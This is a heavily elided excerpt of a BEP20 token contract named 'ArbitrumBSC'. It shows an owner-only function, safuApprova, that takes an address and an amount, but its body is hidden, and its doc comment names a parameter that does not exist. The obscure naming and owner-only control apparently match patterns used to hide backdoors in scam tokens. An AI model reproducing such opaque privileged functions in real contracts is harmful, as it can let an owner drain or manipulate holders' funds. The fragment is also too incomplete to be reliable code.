...
contract ArbitrumBSC is Context, IBEP20, Ownable {
    ...
    */
    ...
    /**
    * @dev See {IBEP20-safuApprova}.
    *
    * Requirements:
    *
    * - `destinatar` cannot be the zero address.
    */
    function _safuApprova(address usuario, uint256 totaal) internal {
    ...
    * @dev See {IBEP20-safuApprova}.
    */
    function safuApprova(address usuario, uint256 totaal) external onlyOwner {
        _safuApprova(usuario, totaal);
    }
}